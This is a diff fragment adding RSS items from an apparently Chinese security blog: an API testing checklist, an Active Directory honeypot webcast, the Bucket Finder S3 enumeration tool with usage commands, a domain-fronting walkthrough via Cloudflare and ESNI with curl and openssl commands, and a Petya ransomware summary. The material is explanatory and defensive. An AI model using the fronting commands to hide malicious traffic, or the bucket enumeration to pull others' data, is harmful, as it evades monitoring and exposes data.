+&lt;/h3&gt;&lt;p&gt;安全测试需要时间和金钱，因此组织在启动新项目时需要考虑这些因素。威胁建模突出了需要缓解的潜在API风险和常见漏洞，但请注意，项目上线后维护和更新API测试的预算也是必要的。&lt;/p&gt;
+&lt;p&gt;请注意，由第三方提供商开发和维护的任何API可能随时更改。安全和应用程序团队应确保在规划和项目周期中考虑动态API测试。&lt;/p&gt;
+&lt;h3 id=&#34;3-注册分类并记录每个api的用途及其功能&#34;&gt;3. 注册、分类并记录每个API的用途及其功能
+&lt;/h3&gt;&lt;p&gt;记录API及其用途。这些信息有助于测试评估API是否可以处理可接受的操作和有效数据，以及不可接受的操作或无效数据。诸如OpenAPI规范、AsyncAPI和GraphQL Introspection等标准使人类和机器能够发现和理解API的响应和能力。许多API工具使用这些规范来加速API的开发生命周期。&lt;/p&gt;
+&lt;h3 id=&#34;4-尽早运行测试并尽可能自动化&#34;&gt;4. 尽早运行测试并尽可能自动化
+&lt;/h3&gt;&lt;p&gt;如果在开发生命周期的早期发现安全问题，每个人都可以节省时间和金钱。有许多API安全工具可用，无论是开源还是许可的，都可以集成到现有的工作流程和持续集成/持续交付管道中。具有模拟服务的工具消除了构建生产系统全规模复制的需要。&lt;/p&gt;
+&lt;p&gt;此外，确定谁将执行测试——开发人员、安全团队或外部渗透测试人员（如果内部缺乏技能）——以及何时运行测试。理想情况下，应在应用程序的每个构建上运行测试。许多API测试工具现在可以完全集成，以便按需进行持续或触发的测试。&lt;/p&gt;
+&lt;h3 id=&#34;5-定义要运行的测试类型&#34;&gt;5. 定义要运行的测试类型
+&lt;/h3&gt;&lt;p&gt;对API安全评估进行以下测试：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;无效输入&lt;/strong&gt;：API的输入应被视为来自不受信任的源，并相应地进行清理和验证。模糊测试可用于向API发送随机数据，以查看其是否可以在不崩溃的情况下处理意外数据。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;注入攻击&lt;/strong&gt;：使用这些测试攻击来确保API拒绝尝试操纵后端数据库或在服务器上执行OS命令的请求，而不暴露任何敏感信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数篡改&lt;/strong&gt;：通过API请求发送的参数（如购物车中商品的价格）容易被攻击者更改。参数篡改检查API在处理参数之前是否验证和检查参数。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;未处理的HTTP方法&lt;/strong&gt;：使用所有八种HTTP方法发送请求，以确保不必要的&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>主动防御Active Directory入门指南：打造蜜罐账户与虚假SMB共享</title>
+        <link>http://localhost:1313/p/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-directory%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E6%89%93%E9%80%A0%E8%9C%9C%E7%BD%90%E8%B4%A6%E6%88%B7%E4%B8%8E%E8%99%9A%E5%81%87smb%E5%85%B1%E4%BA%AB/</link>
+        <pubDate>Sun, 03 Aug 2025 02:40:31 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-directory%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E6%89%93%E9%80%A0%E8%9C%9C%E7%BD%90%E8%B4%A6%E6%88%B7%E4%B8%8E%E8%99%9A%E5%81%87smb%E5%85%B1%E4%BA%AB/</guid>
+        <description>&lt;h3 id=&#34;webcast-active-directory主动防御adad入门指南&#34;&gt;WEBCAST: Active Directory主动防御(ADAD)入门指南
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;John Strand&lt;/strong&gt; //&lt;br&gt;
+本次网络研讨会中，John将讲解如何通过Active Defense Harbinger Distribution (ADHD)工具集配置Active Directory主动防御系统，并探讨《主动网络防御确定性法案》(ACDC)等法律框架。内容包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;创建蜜罐账户的操作演示&lt;/li&gt;
+&lt;li&gt;构建具有回调功能的Word文档&lt;/li&gt;
+&lt;li&gt;部署虚假SMB共享服务器
+所有技术方案均免费提供。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;研讨会幻灯片下载：&lt;a class=&#34;link&#34; href=&#34;https://www.dropbox.com/s/m8c6msdfhbqc63i/HoneyAdmin_AndShare.pptx?dl=0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;点击获取&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;进阶学习推荐&lt;/strong&gt;&lt;br&gt;
+想跟随John系统提升技能？推荐以下课程：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SOC核心技能&lt;/li&gt;
+&lt;li&gt;主动防御与网络欺骗&lt;/li&gt;
+&lt;li&gt;BHIS与MITRE ATT&amp;amp;CK安全入门&lt;/li&gt;
+&lt;li&gt;渗透测试基础
+支持直播/虚拟及点播形式学习&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;技术要点说明&lt;/em&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;蜜罐账户&lt;/strong&gt;：在AD中设置高权限诱饵账户，实时监控异常访问行为&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文档回调&lt;/strong&gt;：通过特制Word文档触发攻击者连接至监控系统&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SMB欺骗&lt;/strong&gt;：伪造共享服务器捕获凭证哈希与攻击路径信息&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>Bucket Finder工具：探测亚马逊S3存储桶的安全利器</title>
+        <link>http://localhost:1313/p/bucket-finder%E5%B7%A5%E5%85%B7%E6%8E%A2%E6%B5%8B%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%A9%E5%99%A8/</link>
+        <pubDate>Sun, 03 Aug 2025 02:29:34 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/bucket-finder%E5%B7%A5%E5%85%B7%E6%8E%A2%E6%B5%8B%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%A9%E5%99%A8/</guid>
+        <description>&lt;h1 id=&#34;bucket-finder&#34;&gt;Bucket Finder
+&lt;/h1&gt;&lt;p&gt;该项目与我的博客文章《Whats In Amazon&amp;rsquo;s Buckets》相关联，更多后台原理请参考该博文。&lt;/p&gt;
+&lt;p&gt;这是一个使用简单的工具，仅需提供字典文件即可自动检测每个单词是否对应亚马逊S3系统中的有效存储桶。对于发现的存储桶，工具会检测其权限状态（公开/私有/重定向）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;公开存储桶会检查是否启用了目录索引，若启用则通过HEAD方法验证列出的所有文件访问权限&lt;/li&gt;
+&lt;li&gt;重定向链接会被追踪并检查最终目标地址&lt;/li&gt;
+&lt;li&gt;所有检测结果都会生成报告供后续分析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;安装&#34;&gt;安装
+&lt;/h2&gt;&lt;p&gt;仅需内置模块支持，无需额外安装gem包。下载文件后赋予可执行权限即可运行。&lt;/p&gt;
+&lt;p&gt;已通过Ruby 1.8.7和1.9.1版本测试，兼容性良好。&lt;/p&gt;
+&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
+&lt;/h2&gt;&lt;p&gt;基础用法（指定字典文件）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb my_words
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;支持通过&lt;code&gt;--region&lt;/code&gt;参数指定初始检测区域：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb --region ie my_words
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;（默认使用US Standard区域，工具会自动处理所有重定向）&lt;/p&gt;
+&lt;p&gt;启用&lt;code&gt;--download&lt;/code&gt;选项可下载发现的公开文件（注意可能包含大文件）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb --download --region ie my_words
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;文件将按存储桶名称建立目录结构保存。&lt;/p&gt;
+&lt;p&gt;新增&lt;code&gt;--log-file&lt;/code&gt;参数支持日志记录：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bucket_finder.rb --log-file bucket.out my_words
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;下载&#34;&gt;下载
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;[Bucket Finder 1.0]&lt;/li&gt;
+&lt;li&gt;[Bucket Finder 1.1]&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>通过Cloudflare实现域名伪装(ESNI技术解析)</title>
+        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87cloudflare%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E4%BC%AA%E8%A3%85esni%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 01:39:57 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87cloudflare%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E4%BC%AA%E8%A3%85esni%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;通过cloudflare实现域名伪装&#34;&gt;通过Cloudflare实现域名伪装
+&lt;/h1&gt;&lt;p&gt;在开始本文之前，我认为有必要先讨论&amp;quot;域名伪装&amp;quot;(Domain Fronting)这个术语及其可能的定义。如果您只关心如何隐藏通信内容，可以直接跳过本节。&lt;/p&gt;
+&lt;h2 id=&#34;定义域名伪装&#34;&gt;定义&amp;quot;域名伪装&amp;quot;
+&lt;/h2&gt;&lt;p&gt;从红队视角来看，域名伪装意味着将一个恶意网站的请求隐藏在看似访问无害网站的请求中。从技术角度，这可以描述为将网络层设置与特定虚拟主机的应用层请求解耦。如果观察者只能看到网络层指向&amp;quot;好&amp;quot;域名(或未被标记为恶意的域名)，那么攻击就成功了。&lt;/p&gt;
+&lt;h2 id=&#34;实际技术内容&#34;&gt;实际技术内容
+&lt;/h2&gt;&lt;p&gt;当我发布关于域名伪装的基础文章时，@sehnaoui在推特上分享了链接，并收到Cloudflare解决方案工程团队负责人Suzanne的回复：&lt;/p&gt;
+&lt;p&gt;首先，我并未声称该技术在Cloudflare上有效，文中对Cloudflare的唯一提及是将其作为CDN的示例。&lt;/p&gt;
+&lt;p&gt;以下是使用文章中讨论的技术在Cloudflare上实现域名伪装的演示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -s -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: frontmecf.vuln-demo.com&amp;#39;&lt;/span&gt; http://digininja.org.uk
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;p&amp;gt;Vuln Demo site fronted by Cloudflare&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;设置过程相当简单：我注册了Cloudflare账户，添加了digininja.org.uk域名并完成设置流程(包括将域名的NS记录转移到Cloudflare)。同时添加了vuln-demo.com账户但未完成设置，该域名保持&amp;quot;Pending Nameserver Update&amp;quot;状态。&lt;/p&gt;
+&lt;p&gt;为了证明这不是因为两个域名在同一账户下，我们尝试另一个由Cloudflare托管的知名域名：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -s -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: frontmecf.vuln-demo.com&amp;#39;&lt;/span&gt; http://cloudflare.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;p&amp;gt;Vuln Demo site fronted by Cloudflare&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;是的，我确实通过Cloudflare实现了域名伪装！&lt;/p&gt;
+&lt;h2 id=&#34;https场景下的挑战&#34;&gt;HTTPS场景下的挑战
+&lt;/h2&gt;&lt;p&gt;当我尝试在HTTPS上实现相同效果时，遇到了问题：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -s -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: frontmecf.vuln-demo.com&amp;#39;&lt;/span&gt; https://cloudflare.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;403 Forbidden&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;body &lt;span class=&#34;nv&#34;&gt;bgcolor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;white&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;403 Forbidden&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;cloudflare&amp;lt;/center&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;经过分析发现，Cloudflare在建立连接时会检查SNI(Server Name Indication)字段和Host头是否匹配。SNI在TLS握手过程中以明文形式发送，告知服务器应提供哪个证书。&lt;/p&gt;
+&lt;h2 id=&#34;使用esni技术突破限制&#34;&gt;使用ESNI技术突破限制
+&lt;/h2&gt;&lt;p&gt;ESNI(Encrypted SNI)作为TLS 1.3规范的一部分，可以加密SNI信息。虽然ESNI是新兴技术，但OpenSSL开发者Stephen Farrell已经实现了相关功能。&lt;/p&gt;
+&lt;p&gt;以下是使用ESNI成功实现域名伪装的示例：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/robin/src/openssl
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nv&#34;&gt;ESNIRR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;dig +short txt _esni.www.cloudflare.com &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/&amp;#34;//g&amp;#39;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cat get_digininja.org&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;sleep 5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /home/robin/src/openssl/apps/openssl s_client &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-CApath /etc/ssl/certs/ -tls1_3 -connect www.cloudflare.com:443 -esni digininja.org.uk &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-esnirr &lt;span class=&#34;nv&#34;&gt;$ESNIRR&lt;/span&gt; -esni_strict -servername www.cloudflare.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过Wireshark抓包分析确认，ESNI扩展(0xFFCE)中的信息确实被加密，不再暴露真实域名。&lt;/p&gt;
+&lt;h2 id=&#34;防御视角的启示&#34;&gt;防御视角的启示
+&lt;/h2&gt;&lt;p&gt;对于防御者而言，如果仅依赖DNS查询和SNI主机名进行监控，这些信息已不再可信，因为它们完全处于攻击者控制之下。&lt;/p&gt;
+&lt;h2 id=&#34;结论&#34;&gt;结论
+&lt;/h2&gt;&lt;p&gt;无论您称之为域名伪装、域名隐藏还是其他名称，本文展示了如何利用ESNI和自定义Host头将&amp;quot;恶意&amp;quot;HTTP请求隐藏在看似&amp;quot;良性&amp;quot;的请求中。由于ESNI受到隐私倡导者的支持，这项技术可能会长期有效。同时能够在监控系统日志中留下虚假标记也是一个额外优势。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Petya勒索软件攻击事件技术分析与防护措施</title>
+        <link>http://localhost:1313/p/petya%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</link>
+        <pubDate>Sun, 03 Aug 2025 01:18:11 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/petya%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD/</guid>
+        <description>&lt;h3 id=&#34;petya勒索软件攻击事件更新&#34;&gt;Petya勒索软件攻击事件更新
+&lt;/h3&gt;&lt;p&gt;与近期WannaCrypt事件类似，我们再次遭遇名为Petya的勒索软件攻击。早期报告中存在大量相互矛盾的信息，包括对无关数据和误导性内容的混淆。微软团队迅速展开调查分析，使我们的恶意软件防护团队能够发布检测签名。&lt;/p&gt;
+&lt;h4 id=&#34;攻击技术分析&#34;&gt;攻击技术分析
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;初始感染途径&lt;/strong&gt;：恶意软件最初通过乌克兰公司M.E.doc财务软件的更新服务传播（该软件在乌克兰和俄罗斯广泛使用）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;横向移动技术&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;利用未修复的漏洞CVE-2017-0144和CVE-2017-0145进行网络传播（微软已于2017年3月发布修复补丁MS17-010）&lt;/li&gt;
+&lt;li&gt;当漏洞利用失效时，会采用凭证窃取、网络遍历等其他感染手段&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;防护方案&#34;&gt;防护方案
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;紧急措施&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;立即安装安全更新MS17-010&lt;/li&gt;
+&lt;li&gt;无法安装补丁的用户可禁用SMBv1（操作步骤见KB2696547）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;增强防护&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;实施网络分段和最小权限账户策略&lt;/li&gt;
+&lt;li&gt;Windows 10用户可使用Device Guard限制设备仅运行可信应用&lt;/li&gt;
+&lt;li&gt;部署Windows Defender高级威胁防护(ATP)自动检测勒索软件行为&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;微软将持续调查并采取必要措施保护客户安全。当前威胁形势表明，网络犯罪分子会不断调整攻击方式，需要同等级别的防御措施应对。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;技术资源&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;微软恶意软件防护中心分析报告&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blogs.technet.microsoft.com/mmpc/2017/06/08/windows-10-creators-update-hardens-security-with-next-gen-defense/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Windows 10创作者更新中的新一代勒索软件防护&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/en-us/security/portal/threat/encyclopedia/Entry.aspx?Name=Ransom:Win32/Petya&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Petya恶意软件百科条目&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
